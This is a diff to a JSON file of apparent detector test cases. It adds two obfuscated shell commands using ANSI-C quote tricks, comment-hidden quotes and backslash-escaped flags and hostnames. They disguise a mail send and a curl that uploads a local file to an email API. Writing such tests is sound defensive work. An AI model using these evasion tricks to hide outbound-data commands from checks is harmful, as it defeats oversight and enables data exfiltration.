@@ -4333,6 +4333,16 @@
       "name": "ANSICQUOTE1127 round 5 (Revizor 5865 J4): G07x backslash-newline between $ and the quote, A shape",
       "cmd": "echo $\\\n'a\\'b'\n$X --to a@example.com --body B",
       "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 review (Revizor 5892 J5): H10 trigger, shift, \"$'\" pair around: flag and address with backslash-letters",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; echo $'a\\' # ' ; echo \"$'\" ; $X --\\to tom@\\example.com --body B ; echo \"'\"",
+      "expected": true
+    },
+    {
+      "name": "ANSICQUOTE1127 round 5 review (Revizor 5892 J5): H11 trigger, shift, \"$'\" pair around: mail host with a backslash-letter, curl",
+      "cmd": "# it's\necho $[1<<2]\necho \"$'\" ; echo $'a\\' # ' ; echo \"$'\" ; curl -d @m.json https://api.\\resend.com/emails ; echo \"'\"",
+      "expected": true
     }
   ]
 }
